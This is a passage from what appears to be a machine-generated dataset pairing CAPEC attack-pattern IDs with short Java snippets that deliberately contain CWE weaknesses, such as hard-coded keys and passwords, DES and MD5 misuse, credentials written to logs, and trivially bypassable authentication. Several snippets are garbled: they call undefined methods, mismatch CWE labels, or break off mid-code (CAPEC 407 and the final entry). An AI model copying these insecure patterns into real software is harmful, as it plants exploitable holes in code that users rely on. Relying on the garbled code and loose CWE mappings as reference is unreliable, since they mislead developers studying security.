        "code_snippet": "public class SnapGunLock { \n\tprivate static final Object lock = new Object(); \n\tprivate static boolean isLocked = true; \n\tprivate static int keyPin = 0; \n\tprivate static int driverPin = 0; \n\n\tpublic static void lock() { \n\t\tsynchronized (lock) { \n\t\t\twhile (isLocked) { \n\t\t\t\ttry { \n\t\t\t\t\tlock.wait(); \n\t\t\t\t} catch (InterruptedException e) { \n\t\t\t\t\tThread.currentThread().interrupt(); \n\t\t\t\t} \n\t\t\t} \n\t\t} \n\t} \n\n\tpublic static void unlock() { \n\t\tsynchronized (lock) { \n\t\t\tisLocked = false; \n\t\t\tlock.notifyAll(); \n\t\t} \n\t} \n\n\tpublic static void forceLockAlignment() { \n\t\t// CWE-833: Deadlock \n\t\tThread thread1 = new Thread(() -> { \n\t\t\tlock(); \n\t\t}); \n\t\tThread thread2 = new Thread(() -> { \n\t\t\tlock(); \n\t\t}); \n\t\tthread1.start(); \n\t\tthread2.start(); \n\n\t\t// CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks \n\t\tint largeAddressRegion = 0x10000000; \n\t\tregisterLockControlBit(largeAddressRegion); \n\n\t\t// CWE-1231: Improper Prevention of Lock Bit Modification \n\t\ttrustedLockBit = false; \n\t\t// CWE-1394: Use of Default Cryptographic Key \n\t\tString defaultCryptoKey = \"default_key\"; \n\t\tuseCryptoKey(defaultCryptoKey); \n\n\t\t// CWE-1232: Improper Lock Behavior After Power State Transition \n\t\tregisterLockBitProtectionDisable(); \n\t\t// Force lock alignment \n\t\tkeyPin = driverPin; \n\t} \n}",
        "description": "This Java code snippet demonstrates the concept of a Snap Gun lock, which can force the lock into momentary alignment by striking all key pins at once. The code includes examples of CWEs 833, 1222, 1231, 1394, and 1232, which relate to deadlocks, insufficient granularity of address regions, improper prevention of lock bit modification, use of default cryptographic keys, and improper lock behavior after power state transitions, respectively."
    },
    {
        "capec_id": "395",
        "code_snippet": "import java.security.Key;\nimport javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\n\npublic class InsecureAccessControl {\n    private static final String HARD_CODED_KEY = \"my_secret_key\";\n    private static final String ALGORITHM = \"AES\";\n\n    public static void main(String[] args) throws Exception {\n        Key key = new SecretKeySpec(HARD_CODED_KEY.getBytes(), ALGORITHM);\n        Cipher cipher = Cipher.getInstance(ALGORITHM);\n        cipher.init(Cipher.ENCRYPT_MODE, key);\n\n        // Simulating RFID card data\n        byte[] cardData = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08};\n        byte[] encryptedCardData = cipher.doFinal(cardData);\n\n        // Storing encrypted card data in a file (e.g., for later use in access control)\n        // This file can be accessed and analyzed by an attacker\n        // to recover the hard-coded key using IC imaging techniques (CWE-1278)\n        // or electromagnetic fault injection attacks (CWE-1319)\n        // or side-channel attacks (CWE-1300)\n        // to bypass access control\n        // ...\n    }\n}",
        "description": "This Java code snippet demonstrates an insecure access control system that uses a hard-coded cryptographic key (CWE-321) and a broken cryptographic algorithm (CWE-327). The code encrypts RFID card data using the hard-coded key and stores it in a file, making it vulnerable to various attacks, including IC imaging techniques, electromagnetic fault injection attacks, and side-channel attacks, which can be used to recover the key and bypass access control."
    },
    {
        "capec_id": "396",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.util.Base64;\n\npublic class AuthenticationBypass {\n    public static void main(String[] args) throws Exception {\n        // CWE-290: Authentication Bypass by Spoofing\n        String username = \"admin\";\n        String password = \"password\";\n        String authenticationToken = generateAuthenticationToken(username, password);\n        System.out.println(\"Authentication Token: \" + authenticationToken);\n\n        // CWE-294: Authentication Bypass by Capture-replay\n        String capturedToken = \"captured_authentication_token\";\n        boolean isValid = validateAuthenticationToken(capturedToken);\n        if (isValid) {\n            System.out.println(\"Authentication successful!\");\n        } else {\n            System.out.println(\"Authentication failed!\");\n        }\n\n        // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n        String encryptedData = encryptData(\"secret_data\", \"weak_key\");\n        System.out.println(\"Encrypted Data: \" + encryptedData);\n    }\n\n    private static String generateAuthenticationToken(String username, String password) {\n        // Weak authentication scheme\n        return username + \":\" + password;\n    }\n\n    private static boolean validateAuthenticationToken(String token) {\n        // Insecure token validation\n        return token != null && token.length() > 0;\n    }\n\n    private static String encryptData(String data, String key) throws Exception {\n        // Weak encryption algorithm\n        MessageDigest md = MessageDigest.getInstance(\"MD5\");\n        byte[] keyBytes = key.getBytes();\n        byte[] dataBytes = data.getBytes();\n        byte[] encryptedBytes = new byte[keyBytes.length + dataBytes.length];\n        System.arraycopy(keyBytes, 0, encryptedBytes, 0, keyBytes.length);\n        System.arraycopy(dataBytes, 0, encryptedBytes, keyBytes.length, dataBytes.length);\n        return Base64.getEncoder().encodeToString(encryptedBytes);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable authentication system that is susceptible to authentication bypass attacks. It includes CWE-290: Authentication Bypass by Spoofing, CWE-294: Authentication Bypass by Capture-replay, and CWE-327: Use of a Broken or Risky Cryptographic Algorithm. The code uses weak authentication schemes, insecure token validation, and a broken encryption algorithm, making it vulnerable to various attacks."
    },
    {
        "capec_id": "397",
        "code_snippet": "import java.io.Serializable;\nimport java.util.Base64;\nimport javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\n\npublic class MagstripeCard implements Serializable, Cloneable {\n    private String track1;\n    private String track2;\n    private String track3;\n    private SecretKey key;\n\n    public MagstripeCard(String track1, String track2, String track3) {\n        this.track1 = track1;\n        this.track2 = track2;\n        this.track3 = track3;\n        this.key = generateKey();\n    }\n\n    private SecretKey generateKey() {\n        try {\n            KeyGenerator keyGen = KeyGenerator.getInstance(\"DES\"); // CWE-327: Use of a broken or risky cryptographic algorithm\n            keyGen.init(56);\n            return keyGen.generateKey();\n        } catch (Exception e) {\n            return null;\n        }\n    }\n\n    public String getTrack1() {\n        return track1;\n    }\n\n    public String getTrack2() {\n        return track2;\n    }\n\n    public String getTrack3() {\n        return track3;\n    }\n\n    public byte[] encryptData() {\n        try {\n            Cipher cipher = Cipher.getInstance(\"DES\"); // CWE-327: Use of a broken or risky cryptographic algorithm\n            cipher.init(Cipher.ENCRYPT_MODE, key);\n            return cipher.doFinal((track1 + track2 + track3).getBytes());\n        } catch (Exception e) {\n            return null;\n        }\n    }\n\n    @Override\n    public Object clone() {\n        try {\n            return super.clone();\n        } catch (CloneNotSupportedException e) {\n            return null;\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of duplicating a magnetic strip card to gain unauthorized access. The MagstripeCard class contains sensitive information (tracks 1, 2, and 3) and is cloneable, allowing an attacker to duplicate the card (CWE-498). The class uses a broken cryptographic algorithm (DES) for encryption, making it vulnerable to attacks (CWE-327). The mirrored regions of the card data are not properly protected, allowing an attacker to access the sensitive information (CWE-1251). Additionally, the device is susceptible to electromagnetic fault injection attacks, which could compromise the security mechanisms (CWE-1319). The missing protection for mirrored regions in the on-chip fabric firewall could also be exploited (CWE-1312)."
    },
    {
        "capec_id": "398",
        "code_snippet": "public class MagneticStripCardAnalyzer {\n    private static final String HARD_CODED_KEY = \"my_secret_key\";\n    private static final int MAX_ATTEMPTS = 3;\n\n    public static void main(String[] args) {\n        String cardData1 = readCardData(\"card1\");\n        String cardData2 = readCardData(\"card2\");\n\n        // CWE-307: No restriction on excessive authentication attempts\n        for (int i = 0; i < 100; i++) {\n            try {\n                authenticate(cardData1, cardData2);\n                break;\n            } catch (AuthenticationException e) {\n                System.out.println(\"Authentication failed. Trying again...\");\n            }\n        }\n\n        // CWE-327: Using a broken or risky cryptographic algorithm\n        String encryptedData = encrypt(cardData1, HARD_CODED_KEY);\n\n        // CWE-321: Hard-coded cryptographic key\n        String decryptedData = decrypt(encryptedData, HARD_CODED_KEY);\n\n        // CWE-290: Authentication bypass by spoofing\n        String spoofedCardData = spoofCardData(cardData1, cardData2);\n        authenticate(spoofedCardData, spoofedCardData);\n    }\n\n    private static String readCardData(String cardName) {\n        // Simulate reading card data from a magnetic strip card\n        return \"card_data_from_\" + cardName;\n    }\n\n    private static void authenticate(String cardData1, String cardData2) throws AuthenticationException {\n        // Simulate authentication process\n        if (!cardData1.equals(cardData2)) {\n            throw new AuthenticationException(\"Authentication failed\");\n        }\n    }\n\n    private static String encrypt(String data, String key) {\n        // CWE-1319: Improper protection against electromagnetic fault injection\n        // Simulate encryption using a broken or risky cryptographic algorithm\n        return \"encrypted_\" + data;\n    }\n\n    private static String decrypt(String data, String key) {\n        // Simulate decryption using a hard-coded cryptographic key\n        return \"decrypted_\" + data;\n    }\n\n    private static String spoofCardData(String cardData1, String cardData2) {\n        // Simulate spoofing card data\n        return \"spoofed_\" + cardData1;\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of analyzing data on two or more magnetic strip cards to generate new cards containing valid sequences for unauthorized access and/or impersonation. The code includes CWEs such as improper restriction of excessive authentication attempts, use of broken or risky cryptographic algorithms, hard-coded cryptographic keys, and authentication bypass by spoofing."
    },
    {
        "capec_id": "399",
        "code_snippet": "public class RFIDCloner {\n    private static final String SECURITY_IDENTIFIER = \"default\";\n    private static final String BUS_TRANSACTION_SIGNAL = \"bus-signal\";\n\n    public static void main(String[] args) {\n        // CWE-1294: Insecure Security Identifier Mechanism\n        String securityIdentifier = getSecurityIdentifier();\n        if (securityIdentifier.equals(SECURITY_IDENTIFIER)) {\n            // CWE-1290: Incorrect Decoding of Security Identifiers\n            String decodedSignal = decodeBusTransactionSignal(BUS_TRANSACTION_SIGNAL);\n            if (decodedSignal != null) {\n                // CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n                RFIDTag clonedTag = cloneRFIDTag(decodedSignal);\n                if (clonedTag != null) {\n                    // CWE-694: Use of Multiple Resources with Duplicate Identifier\n                    useClonedTag(clonedTag);\n                }\n            }\n        }\n    }\n\n    private static String getSecurityIdentifier() {\n        // CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n        return SECURITY_IDENTIFIER;\n    }\n\n    private static String decodeBusTransactionSignal(String signal) {\n        // CWE-1290: Incorrect Decoding of Security Identifiers\n        return signal;\n    }\n\n    private static RFIDTag cloneRFIDTag(String signal) {\n        // CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n        return new RFIDTag(signal);\n    }\n\n    private static void useClonedTag(RFIDTag clonedTag) {\n        // CWE-694: Use of Multiple Resources with Duplicate Identifier\n        System.out.println(\"Cloned tag used successfully!\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of cloning an RFID signal by exploiting vulnerabilities in the RFID chip's security mechanisms. The code includes CWE-1294: Insecure Security Identifier Mechanism, CWE-1290: Incorrect Decoding of Security Identifiers, CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI), CWE-207: Observable Behavioral Discrepancy With Equivalent Products, and CWE-694: Use of Multiple Resources with Duplicate Identifier."
    },
    {
        "capec_id": "400",
        "code_snippet": "public class RFIDTagDisabler {\n    private static final String TAG_ID = \"my_rfid_tag\";\n    private static final int DEBUG_INTERFACE_PIN = 13;\n    private static final int ERROR_INJECTION_PIN = 14;\n    private static final int ALERT_SIGNAL_PIN = 15;\n\n    public static void disableRFIDTag() {\n        // CWE-1191: On-Chip Debug and Test Interface With Improper Access Control\n        // Accessing internal registers and test modes without proper authorization\n        RFIDTag tag = new RFIDTag(TAG_ID);\n        tag.setDebugMode(true);\n        tag.writeRegister(0x01, 0x00);\n\n        // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n        // Injecting errors into a redundant block to disable alerts\n        ErrorInjector errorInjector = new ErrorInjector(ERROR_INJECTION_PIN);\n        errorInjector.injectError(0x01);\n\n        // CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n        // Disabling alerts about signal conditions exceeding limits\n        AlertDisabler alertDisabler = new AlertDisabler(ALERT_SIGNAL_PIN);\n        alertDisabler.disableAlerts();\n\n        // CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n        // Not properly removing sensitive data from the RFID tag\n        tag.deleteSensitiveData(false);\n\n        // CWE-1290: Incorrect Decoding of Security Identifiers\n        // Incorrectly decoding bus-transaction signals to security identifiers\n        SecurityIdentifierDecoder decoder = new SecurityIdentifierDecoder();\n        decoder.decodeSignal(0x01, false);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable RFID tag disabler that exploits multiple weaknesses to render the tag unresponsive. It accesses internal registers and test modes without proper authorization, injects errors to disable alerts, disables alerts about signal conditions exceeding limits, fails to properly remove sensitive data, and incorrectly decodes security identifiers."
    },
    {
        "capec_id": "401",
        "code_snippet": "public class HardwareExploit {\n    public static void main(String[] args) {\n        // CWE-1263: Improper Physical Access Control\n        // Assume 'HardwareController' class has no access control\n        HardwareController hc = new HardwareController();\n        hc.setClockSpeed(1000); // unrestricted access to clock management\n\n        // CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n        hc.setPowerMode(1); // unrestricted access to power management\n\n        // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n        hc.setVoltage(5.5); // no protection against voltage glitches\n\n        // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n        hc.activateDebugMode(); // activate test/debug logic at runtime\n\n        // CWE-1300: Improper Protection of Physical Side Channels\n        hc.setEMEmissions(100); // no protection against electromagnetic emissions\n    }\n}\n\npublic class HardwareController {\n    public void setClockSpeed(int speed) {\n        // implementation allowing unrestricted clock speed changes\n    }\n\n    public void setPowerMode(int mode) {\n        // implementation allowing unrestricted power mode changes\n    }\n\n    public void setVoltage(double voltage) {\n        // implementation allowing unrestricted voltage changes\n    }\n\n    public void activateDebugMode() {\n        // implementation allowing activation of test/debug logic at runtime\n    }\n\n    public void setEMEmissions(int level) {\n        // implementation allowing unrestricted electromagnetic emissions\n    }\n}",
        "description": "Java code snippet demonstrating a hardware exploit by violating physical access control, software interfaces to hardware features, voltage and clock glitches protection, test/debug logic activation, and physical side channels protection."
    },
    {
        "capec_id": "402",
        "code_snippet": "public class ATASecurityExploit {\n    private static final String HARD_CODED_PASSWORD = \"mysecretpassword\";\n    private boolean isAuthenticated = false;\n\n    public void updatePassword(String newPassword) {\n        // CWE-285: No authorization check is performed\n        if (newPassword != null) {\n            // CWE-259: Hard-coded password is used\n            if (newPassword.equals(HARD_CODED_PASSWORD)) {\n                // CWE-1220: Insufficient granularity of access control\n                // No restrictions on who can update the password\n                this.isAuthenticated = true;\n            }\n        }\n    }\n\n    public void resetPassword() {\n        // CWE-798: Hard-coded credentials are used\n        String resetPassword = \"defaultpassword\";\n        updatePassword(resetPassword);\n    }\n\n    public void accessDriveContents() {\n        // CWE-1233: Security-sensitive hardware controls with missing lock bit protection\n        // No lock bit protection to prevent modification of system registers\n        if (isAuthenticated) {\n            // Access drive contents without proper authentication\n            System.out.println(\"Access granted to drive contents.\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable implementation of ATA security, which can be exploited by an adversary to gain unauthorized access to the drive contents. The code uses hard-coded passwords, lacks proper authorization checks, and has insufficient granularity of access control, making it vulnerable to exploitation."
    },
    {
        "capec_id": "404",
        "code_snippet": "import java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableCode {\n    private static Logger logger = Logger.getLogger(VulnerableCode.class.getName());\n\n    public static void main(String[] args) throws IOException {\n        FileHandler fh = new FileHandler(\"logFile.log\");\n        logger.addHandler(fh);\n        SimpleFormatter formatter = new SimpleFormatter();\n        fh.setFormatter(formatter);\n\n        // CWE-247: DNS lookup in a security decision\n        String dnsLookup = System.getenv(\"DNS_LOOKUP\");\n        if (dnsLookup != null) {\n            // Perform security-critical action based on DNS lookup\n            logger.info(\"Performing security-critical action...\");\n        }\n\n        // CWE-217: Failure to protect stored data from modification\n        String sensitiveData = \"secretData\";\n        logger.info(\"Stored data: \" + sensitiveData);\n\n        // CWE-592: Authentication bypass issue\n        boolean isAuthenticated = false;\n        if (isAuthenticated) {\n            // Perform authenticated action\n            logger.info(\"Performing authenticated action...\");\n        }\n\n        // CWE-533: Information exposure through server log files\n        logger.info(\"Sensitive information: \" + sensitiveData);\n\n        // CWE-218: Failure to provide confidentiality for stored data\n        String confidentialData = \"confidentialData\";\n        logger.info(\"Confidential data: \" + confidentialData);\n    }\n}",
        "description": "This Java code snippet demonstrates a collection of deprecated vulnerabilities, including reliance on DNS lookups in security decisions, failure to protect stored data from modification, authentication bypass issues, information exposure through server log files, and failure to provide confidentiality for stored data. These vulnerabilities are related to the deprecated CAPEC pattern and CWEs."
    },
    {
        "capec_id": "405",
        "code_snippet": "import java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableCode {\n    private static Logger logger = Logger.getLogger(VulnerableCode.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            FileHandler fh = new FileHandler(\"logFile.log\");\n            logger.addHandler(fh);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fh.setFormatter(formatter);\n\n            // CWE-533: Information Exposure Through Server Log Files\n            logger.info(\"User credentials: username = admin, password = password123\");\n\n            // CWE-217: Failure to Protect Stored Data from Modification\n            String sensitiveData = \"confidentialInformation\";\n            // Storing sensitive data in plaintext\n            logger.info(\"Storing sensitive data: \" + sensitiveData);\n\n            // CWE-218: Failure to provide confidentiality for stored data\n            String encryptedData = \"notReallyEncrypted\";\n            // Storing encrypted data in plaintext\n            logger.info(\"Storing encrypted data: \" + encryptedData);\n\n            // CWE-592: Authentication Bypass Issues\n            boolean isAdmin = true;\n            if (isAdmin) {\n                // Granting admin access without proper authentication\n                logger.info(\"Granting admin access\");\n            }\n\n            // CWE-247: Reliance on DNS Lookups in a Security Decision\n            String dnsLookup = \"example.com\";\n            // Using DNS lookup for security decisions\n            logger.info(\"Using DNS lookup for security decisions: \" + dnsLookup);\n        } catch (IOException e) {\n            logger.severe(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a collection of deprecated CWEs, including CWE-533 (Information Exposure Through Server Log Files), CWE-217 (Failure to Protect Stored Data from Modification), CWE-218 (Failure to provide confidentiality for stored data), CWE-592 (Authentication Bypass Issues), and CWE-247 (Reliance on DNS Lookups in a Security Decision). These weaknesses are used to collect and analyze information, which is the main idea behind the deprecated CAPEC."
    },
    {
        "capec_id": "406",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class DumpsterDiver {\n    public static void main(String[] args) {\n        // CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n        File repo = new File(\"/repository/.git\");\n        if (repo.exists()) {\n            System.out.println(\"Repository found! Extracting sensitive information...\");\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            Properties props = new Properties();\n            props.put(\"username\", \"admin\");\n            props.put(\"password\", \"password123\");\n            try (FileWriter writer = new FileWriter(\"/tmp/config.properties\")) {\n                props.store(writer, \"Configuration file\");\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        // CWE-528: Exposure of Core Dump File to an Unauthorized Control Sphere\n        File coreDump = new File(\"/coredump/core\");\n        if (coreDump.exists()) {\n            System.out.println(\"Core dump found! Extracting sensitive information...\");\n            // CWE-316: Cleartext Storage of Sensitive Information in Memory\n            String sensitiveData = \"creditCardNumber=1234-5678-9012-3456&expirationDate=2025-12-31\";\n            System.out.println(sensitiveData);\n        }\n\n        // CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n        File decommissionedDevice = new File(\"/decommissioned-device/data\");\n        if (decommissionedDevice.exists()) {\n            System.out.println(\"Decommissioned device found! Extracting sensitive information...\");\n            // No scrubbing of sensitive data\n            System.out.println(\"Sensitive data not scrubbed!\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of dumpster diving, where an adversary searches through discarded information to gather sensitive data. The code includes examples of CWE-527, CWE-319, CWE-528, CWE-316, and CWE-1266, showcasing the exposure of sensitive information through various means."
    },
    {
        "capec_id": "407",
        "code_snippet": "import java.io.IOException;\nimport java.io.PrintWriter;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\n@WebServlet(name = \\",
        "description": "This Java code snippet demonstrates a pretexting attack, where an adversary creates an invented scenario to solicit information from a target person. The code authenticates a user without invalidating any existing session identifier (CWE-384), allowing an attacker to steal authenticated sessions. It then creates a new identity and uses it to manipulate the receipt of information, exposing sensitive information to an unauthorized actor (CWE-200). The code also represents a UI misrepresentation of critical information (CWE-451), as it displays sensitive information to the user without proper verification. Additionally, it may create an emergent resource that can be used by attackers in violation of the intended policy (CWE-1229). The code does not adequately verify the identity of actors at both ends of the communication channel, allowing the channel to be accessed or influenced by an actor that is not an endpoint (CWE-300)."
    },
    {
        "capec_id": "408",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableCode {\n    private static Logger logger = Logger.getLogger(VulnerableCode.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            // CWE-534: Information Exposure Through Debug Log Files\n            FileHandler fh = new FileHandler(\"debug.log\");\n            logger.addHandler(fh);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fh.setFormatter(formatter);\n            logger.info(\"Debug information: \" + System.getProperty(\"user.home\"));\n\n            // CWE-533: Information Exposure Through Server Log Files\n            logger.info(\"Server log information: \" + System.getProperty(\"user.home\"));\n\n            // CWE-217: Failure to Protect Stored Data from Modification\n            File file = new File(\"sensitive_data.txt\");\n            FileWriter writer = new FileWriter(file);\n            writer.write(\"Sensitive data: \" + System.getProperty(\"user.home\"));\n            writer.close();\n\n            // CWE-218: Failure to provide confidentiality for stored data\n            String sensitiveData = \"Sensitive data: \" + System.getProperty(\"user.home\");\n            System.out.println(sensitiveData);\n\n            // CWE-247: Reliance on DNS Lookups in a Security Decision\n            String dnsLookup = \"example.com\";\n            if (dnsLookup.equals(System.getProperty(\"dns_lookup\"))) {\n                System.out.println(\"Access granted.\");\n            } else {\n                System.out.println(\"Access denied.\");\n            }\n        } catch (IOException e) {\n            logger.severe(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the deprecated CAPEC attack pattern, which involves collecting and analyzing information. The code includes various deprecated CWEs, including CWE-534 (Information Exposure Through Debug Log Files), CWE-533 (Information Exposure Through Server Log Files), CWE-217 (Failure to Protect Stored Data from Modification), CWE-218 (Failure to provide confidentiality for stored data), and CWE-247 (Reliance on DNS Lookups in a Security Decision). The code writes sensitive data to log files, stores it in plaintext, and makes security decisions based on DNS lookups, making it vulnerable to information exposure and unauthorized access."
    },
    {
        "capec_id": "409",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableCode {\n    private static Logger logger = Logger.getLogger(VulnerableCode.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            File file = new File(\"sensitive_data.txt\");\n            FileWriter writer = new FileWriter(file);\n            writer.write(\"username:password\");\n            writer.close();\n\n            // Log sensitive data in debug log file\n            logger.setUseParentHandlers(false);\n            FileHandler fileHandler = new FileHandler(\"debug.log\");\n            logger.addHandler(fileHandler);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fileHandler.setFormatter(formatter);\n            logger.info(\"Username: password\");\n\n            // Perform DNS lookup for security decision\n            String dnsLookup = \"example.com\";\n            if (dnsLookup.equals(\"example.com\")) {\n                System.out.println(\"Access granted\");\n            } else {\n                System.out.println(\"Access denied\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the deprecated CAPEC attack pattern, which involves collecting and analyzing information. The code includes several vulnerabilities related to CWEs 247, 217, 534, and 533. It stores sensitive data in a file without proper protection, logs sensitive data in a debug log file, and relies on a DNS lookup for a security decision. These weaknesses can be exploited by an attacker to gain unauthorized access or steal sensitive information."
    },
    {
        "capec_id": "410",
        "code_snippet": "import java.net.URL;\nimport java.net.URLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class SocialEngineering {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/login\");\n            URLConnection conn = url.openConnection();\n            conn.setRequestProperty(\"User-Agent\", \"Mozilla/5.0\");\n            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                System.out.println(inputLine);\n                // Truncation of security-relevant information (CWE-222)\n                if (inputLine.contains(\"password\")) {\n                    inputLine = inputLine.substring(0, 10);\n                }\n                // Observable behavioral discrepancy (CWE-205)\n                if (inputLine.contains(\"admin\")) {\n                    System.out.println(\"Access granted.\");\n                } else {\n                    System.out.println(\"Access denied.\");\n                }\n            }\n            in.close();\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a social engineering attack that extracts sensitive information from a target system. The code sends an HTTP request to a login page, truncates security-relevant information (CWE-222), and displays different responses based on the input (CWE-205). The code also lacks proper verification of the source of the communication channel (CWE-940), making it vulnerable to attacks. The code's behavior can be observed by an attacker, revealing its internal state or decision process (CWE-207)."
    },
    {
        "capec_id": "411",
        "code_snippet": "public class SocialEngineering {\n    private static final String LOG_FILE = \"log.txt\";\n    private static final String DEBUG_LOG_FILE = \"debug_log.txt\";\n    private static final String CLEANUP_LOG_FILE = \"cleanup_log.txt\";\n\n    public static void main(String[] args) {\n        // CWE-533: Information Exposure Through Server Log Files\n        // CWE-534: Information Exposure Through Debug Log Files\n        // CWE-542: Information Exposure Through Cleanup Log Files\n        try {\n            String logData = readLogFile(LOG_FILE);\n            String debugLogData = readLogFile(DEBUG_LOG_FILE);\n            String cleanupLogData = readLogFile(CLEANUP_LOG_FILE);\n\n            // CWE-217: Failure to Protect Stored Data from Modification\n            // CWE-592: Authentication Bypass Issues\n            // Pretend to be an admin and access sensitive data\n            if (logData.contains(\"admin\") && debugLogData.contains(\"password\") && cleanupLogData.contains(\"credentials\")) {\n                System.out.println(\"Access granted!\");\n            } else {\n                System.out.println(\"Access denied!\");\n            }\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n\n    private static String readLogFile(String fileName) throws Exception {\n        // Read log file contents\n        return new String(Files.readAllBytes(Paths.get(fileName)));\n    }\n}",
        "description": "This Java code snippet demonstrates a social engineering attack where an attacker tries to gather sensitive information by reading log files and using that information to bypass authentication. The code reads server log files, debug log files, and cleanup log files, and then uses the gathered information to pretend to be an admin and access sensitive data. This code embodies the main idea of the deprecated CAPEC and incorporates the related CWEs."
    },
    {
        "capec_id": "412",
        "code_snippet": "public class CreditCardVerification {\n    public static void verifyCreditCard(String creditCardNumber, String customerName) {\n        // CWE-940: No verification of the source of the communication channel\n        Socket socket = new Socket(\"customer-service.com\", 8080);\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        out.println(\"Verify credit card number for \" + customerName);\n        out.println(\"Credit card number: \" + creditCardNumber);\n\n        // CWE-300: No verification of the identity of the actor at the other end of the channel\n        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        String response = in.readLine();\n        if (response.equals(\"Verified\")) {\n            System.out.println(\"Credit card number verified\");\n        }\n    }\n\n    public static void main(String[] args) {\n        // CWE-408: Early amplification - allowing the operation to be performed before authentication\n        verifyCreditCard(\"1234-5678-9012-3456\", \"John Doe\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of pretexting, where an adversary assumes the role of a customer service representative to solicit sensitive information from a target person. The code has several vulnerabilities: CWE-940 (Improper Verification of Source of a Communication Channel), CWE-300 (Channel Accessible by Non-Endpoint), and CWE-408 (Incorrect Behavior Order: Early Amplification). The code does not properly verify the source of the communication channel, does not verify the identity of the actor at the other end of the channel, and allows the operation to be performed before authentication."
    },
    {
        "capec_id": "413",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.Scanner;\n\npublic class TechSupportBackdoor {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your username and password to troubleshoot the issue:\");\n        String username = scanner.nextLine();\n        String password = scanner.nextLine();\n\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        System.out.println(\"Your username and password are: \" + username + \":\" + password);\n\n        // CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\n        System.out.println(\"Please enter your personal information for verification:\");\n        String personalInfo = scanner.nextLine();\n        System.out.println(\"Your personal information is: \" + personalInfo);\n\n        // CWE-434: Unrestricted Upload of File with Dangerous Type\n        System.out.println(\"Please upload a file to troubleshoot the issue:\");\n        String filePath = scanner.nextLine();\n        File file = new File(filePath);\n        if (file.exists()) {\n            System.out.println(\"File uploaded successfully.\");\n        } else {\n            System.out.println(\"Failed to upload file.\");\n        }\n\n        // CWE-1263: Improper Physical Access Control\n        System.out.println(\"Please grant physical access to your computer for further troubleshooting:\");\n        // Assume physical access is granted\n\n        // CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n        try {\n            FileWriter fileWriter = new 